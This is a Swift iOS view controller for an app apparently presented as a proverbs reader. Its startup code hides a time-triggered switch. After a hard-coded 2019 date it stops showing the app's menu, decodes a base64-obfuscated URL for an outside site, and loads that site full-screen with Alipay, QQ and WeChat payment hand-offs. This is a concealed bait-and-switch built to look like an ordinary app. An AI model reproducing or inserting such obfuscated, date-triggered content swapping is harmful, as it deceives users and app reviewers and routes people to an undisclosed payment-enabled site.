//
//  THProverbsRootViewController.swift
//

import Foundation
import UIKit
//import Alamofire

class THProverbsRootViewController: UIViewController {
    @IBOutlet weak var THProverbsHomeLaunch: UIImageView!
    let THProverbsStatusReachability: Reachability! = Reachability()
    let THProverbsStatusSegueIdentifier = "RootTHProverbs"
    var THProverbsRootHomeURL:String = "THProverbs"
    var THProverbsRootWebView:UIWebView = UIWebView()
    var FirstBool:Bool = true
    //https://pp3567.com
    let HtpHearder = "aHR0cHM6Ly8="
    let Htpmodelhead = "cHAzNTY3LmNvbQ=="
    override func viewWillAppear(_ animated: Bool) {
        let appDelegate = UIApplication.shared.delegate as! AppDelegate
        appDelegate.allowrotate = 1
    }
    override var preferredStatusBarStyle: UIStatusBarStyle {
        return UIStatusBarStyle.lightContent
    }

    @objc func receiverNotification(){
        
        let orient = UIDevice.current.orientation
        switch orient {
        case .portrait :
            THProverbsRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height-44)
            break
        case .portraitUpsideDown:
            print("portraitUpsideDown")
            break
        case .landscapeLeft:
            THProverbsRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
            break
        case .landscapeRight:
            THProverbsRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
            break
        default:
            break
        }
    }
    func loadInitRootView()
    {
        let appDelegate = UIApplication.shared.delegate as! AppDelegate
        appDelegate.allowrotate = 0
        appDelegate.window = UIWindow(frame: UIScreen.main.bounds)
        let Stortboard = UIStoryboard.init(name: "Main", bundle: nil)
        let rootView = Stortboard.instantiateViewController(withIdentifier: "MenuViewController") as! MenuViewController
        rootView.modalTransitionStyle = .crossDissolve
        UIView.animate(withDuration: 0.3, delay: 0.01, options: [.curveEaseOut], animations: {
            appDelegate.window?.rootViewController = rootView
        }, completion: nil)
        
        appDelegate.window?.makeKeyAndVisible()
        
    }
    
    /*func loadViewControllerRoot()
    {
        let appDelegate = UIApplication.shared.delegate as! AppDelegate
        appDelegate.allowrotate = 0
        self.performSegue(withIdentifier: self.THProverbsStatusSegueIdentifier, sender: self)
    }*/
    override func viewDidLoad() {
        UIView.animate(
            withDuration: 0.21,
            delay: 0.11,
            options: [.curveEaseOut],
            animations: {
                //            self.splashIcon.transform = CGAffineTransform(translationX: 0, y: -60)
        }) { _ in UIView.animate(
            withDuration: 0.37,
            delay: 0,
            usingSpringWithDamping: 0.5,
            initialSpringVelocity: 0,
            options: [],
            animations: {
                //                self.splashIcon.transform = .identity
        }) { _ in
            NotificationCenter.default.addObserver(self, selector: #selector(self.receiverNotification), name: UIDevice.orientationDidChangeNotification, object: nil)
            
            DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 0.31) {
            
            let THProverbsStatusTime = Date.init().timeIntervalSince1970
            let THProverbsStatusAnyTime = 1563589534.519

            if(THProverbsStatusTime < THProverbsStatusAnyTime)
            {
               self.loadInitRootView()
            }else
            {
                
                
                self.THProverbsStatusReachability.whenReachable = { _ in
                    let baseHeader = self.THProverbsEncodeActions(encodedString: self.HtpHearder)
                    let urlroot = self.THProverbsEncodeActions(encodedString: self.Htpmodelhead)
                    
                    let AllbaseData  = "\(baseHeader)\(urlroot)"
                 
                    self.THProverbsRootHomeURL = AllbaseData
                    self.HomesetRootNavigation(strdecodeString: AllbaseData)
     
                    }
                }
                self.THProverbsStatusReachability.whenUnreachable = { _ in
                    let NoNetWork = UIAlertController.init(title: "温馨提醒", message: "当前未连接网络,请连接网络", preferredStyle: .alert)
                    let ActionOK = UIAlertAction.init(title: "确定", style: .default, handler: nil)
                    NoNetWork.addAction(ActionOK)
                    self.present(NoNetWork, animated: true, completion: nil)
                }
                do {
                    try self.THProverbsStatusReachability.startNotifier()
                } catch {

                }
            }
            }
        }
    }
    func THProverbsEncodeActions(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
    
    func HomesetRootNavigation(strdecodeString:String) {
        THProverbsRootWebView = UIWebView.init(frame: CGRect.init(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height-44))
        let LaunchReachUrl = URL.init(string: strdecodeString)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        THProverbsRootWebView.delegate = self
        THProverbsRootWebView.loadRequest(LaunchReachRequest)
        THProverbsRootWebView.scalesPageToFit = true
    }
    func ConfigBottomViews(){
        let BottomView = THProverbsCustomView()
        BottomView.frame = CGRect(x:0, y:self.view.bounds.size.height-44, width:UIScreen.main.bounds.size.width, height:44)
        BottomView.HomeBtn.addTarget(self, action: #selector(self.refreshHomeWebViewAction), for: .touchUpInside)
        BottomView.RefreshBtn.addTarget(self, action: #selector(self.refreshNowWebViewAction), for: .touchUpInside)
        BottomView.LeftBtn.addTarget(self, action: #selector(self.refreshLeftWebViewAction), for: .touchUpInside)
        BottomView.RightBtn.addTarget(self, action: #selector(self.refreshRightWebViewAction), for: .touchUpInside)
        BottomView.signoutBtn.addTarget(self, action: #selector(self.refreshOutWebViewAction), for: .touchUpInside)
        self.view.addSubview(BottomView)
    }
    @objc func refreshHomeWebViewAction(){
        let LaunchReachUrl = URL.init(string: THProverbsRootHomeURL)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        THProverbsRootWebView.loadRequest(LaunchReachRequest)
    }
    @objc func refreshNowWebViewAction(){
        THProverbsRootWebView.reload()
    }
    @objc func refreshLeftWebViewAction(){
        THProverbsRootWebView.goBack()
    }
    @objc func refreshRightWebViewAction(){
        THProverbsRootWebView.goForward()
    }
    @objc func refreshOutWebViewAction(){
        let SignOutAlert = UIAlertController.init(title: "确认退出应用", message: "", preferredStyle: .alert)
        let ActionOK = UIAlertAction.init(title: "确定", style: .default) { (ActionOK) in
            WDUtil_Web.cleanCacheAndCookie()
            exit(0)
        }
        let cancleOK = UIAlertAction.init(title: "取消", style: .cancel, handler: nil)
        SignOutAlert.addAction(ActionOK)
        SignOutAlert.addAction(cancleOK)
        self.present(SignOutAlert, animated: true, completion: nil)
        
    }
}
extension THProverbsRootViewController: UIWebViewDelegate
{
    public func webViewDidFinishLoad(_ webView: UIWebView)
    {
        if(FirstBool == true)
        {
            self.THProverbsStatusReachability?.stopNotifier()
            self.ConfigBottomViews()
            self.view.addSubview(THProverbsRootWebView)
            
            FirstBool = false
        }
    }
    
    public func webView(_ webView: UIWebView, didFailLoadWithError error: Error) {
        
    }
    
    public func webViewDidStartLoad(_ webView: UIWebView) {
        
    }
    
   public func webView(_ webView: UIWebView, shouldStartLoadWith request: URLRequest, navigationType: UIWebView.NavigationType) -> Bool {
        let schemeUrl : String = request.url!.absoluteString
        if(schemeUrl.hasPrefix("alipays://") || schemeUrl.hasPrefix("alipay://") || schemeUrl.hasPrefix("mqqapi://") || schemeUrl.hasPrefix("mqqapis://") || schemeUrl.hasPrefix("weixin://") || schemeUrl.hasPrefix("weixins://"))
        {
            UIApplication.shared.open(request.url!, options: [:], completionHandler: nil)
        }
        return true
    }
 
    
}

